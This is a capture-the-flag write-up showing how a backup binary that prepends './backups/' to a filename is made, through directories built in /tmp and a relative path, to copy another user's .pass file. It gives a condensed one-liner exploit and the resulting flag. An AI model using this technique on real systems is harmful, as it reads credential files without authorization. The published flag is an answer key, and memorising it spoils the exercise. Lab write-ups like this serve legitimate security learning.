# level08

The executable creates a backup of a file in a `backups` folder.

We want to back up `/home/users/level09/.pass` to get to the next level.

## **The exploit**

We start by moving to a repository we control : `/tmp`

```
cd /tmp
```

Let's start by running the executable from here :

```
$> /home/users/level08/level08
Usage: /home/users/level08/level08 filename
ERROR: Failed to open ./backups/.log
```

We need to create a `backups` directory. We do it :

```
mkdir backups
```

We try again, this time with our `.pass` as file to be backed up :

```
$> /home/users/level08/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

The executable concatenates our `filename` with `./backups/`, so we can't use an absolute path, which starts with `/`.

We try with the relative path :

```
$> /home/users/level08/level08 ../home/users/level09/.pass
ERROR: Failed to open ./backups/../home/users/level09/.pass
```

We're in `/tmp`, so `./backups/..` is also `/tmp`. Which means the program tries to create a file in `/tmp/home/users/level09`. Let's accodomodate it :

```
mkdir -p home/users/level09
```

We run our command again. It works !

A `cat home/users/level09/.pass` gives us the flag we need.


## **The flag**

We can condense our exploit into the following one-liner :

```
cd /tmp ; mkdir -p backups home/users/level09 ; /home/users/level08/level08 ../home/users/level09/.pass ; cat home/users/level09/.pass
```

We get the flag for `level08` :

```
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```